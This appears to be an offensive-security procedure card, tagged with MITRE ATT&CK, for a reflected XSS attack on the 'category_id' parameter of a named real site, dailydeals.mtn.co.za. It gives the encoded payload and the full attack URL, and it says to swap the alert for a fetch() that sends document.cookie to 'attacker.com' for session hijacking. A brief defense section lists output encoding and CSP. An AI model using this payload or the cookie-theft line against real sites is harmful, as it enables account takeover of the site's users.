---
tags:
  - xss
  - reflected-xss
  - javascript
  - cookie-theft
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:38.120Z'
skill_level: beginner
impact_level: high
detection_risk: medium
sub_techniques: []
id: f81a084c-f7b2-4895-b973-4b37415f1b40
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-in-Category-ID

## Summary

This procedure exploits a reflected XSS vulnerability by injecting a malicious JavaScript payload into the 'category_id' URL parameter, causing unsanitized reflection and execution in the victim's browser to demonstrate alert popups or cookie exfiltration.

## Description

On sites like dailydeals.mtn.co.za using ColdFusion, the server echoes the 'category_id' value without filtering HTML/JS metacharacters, allowing attackers to craft phishing URLs. The payload <img src=a onerror=alert(1)> breaks out of context and executes on load. For impact, adapt to send document.cookie to an attacker server. Requires the categories endpoint URL; outcomes include session hijacking via stolen cookies.

## Requirements

1. URL with 'category_id' parameter exposed
2. Knowledge of URL encoding for payloads
3. Victim browser to test execution (or self for PoC)

## Defense

Defensive measures and detection strategies:

- Implement output encoding (e.g., HTML entity encoding) for all reflected parameters
- Use Content Security Policy (CSP) to block inline scripts
- Scan for XSS with tools like OWASP ZAP and log suspicious payloads

## Objectives

1. Execute arbitrary JavaScript in the browser context
2. Steal sensitive data like session cookies
3. Enable follow-on attacks like phishing or account takeover

## Instructions

### Step 1: Craft and URL-Encode Payload

**Context**: Prepare a simple XSS payload to test reflection and execution, ensuring it evades basic filters.

No command; manually construct: Use payload '3mh8r<img src=a onerror=alert(1)>', encode special chars: %3c for <, %3e for >, etc., resulting in '3mh8r%3cimg%20src%3da%20onerror%3dalert(1)%3e'.

> This prepends junk ('3mh8r') to avoid immediate detection. Verify encoding with a tool like URLDecoder.

### Step 2: Modify and Load URL

**Context**: Inject the encoded payload into the parameter and load to trigger execution.

Update URL to: https://dailydeals.mtn.co.za/index.cfm?GO=DEALS&category_id=3mh8r%3cimg%20src%3da%20onerror%3dalert(1)%3e

> Page loads; inspect source to see reflection (e.g., in category title). Alert(1) pops up, confirming success. For real exploit, replace alert with 'fetch("http://attacker.com?cookie="+document.cookie)'.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Collection]] Collection

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
- [[JavaScript]]
- [[cookie-theft]]
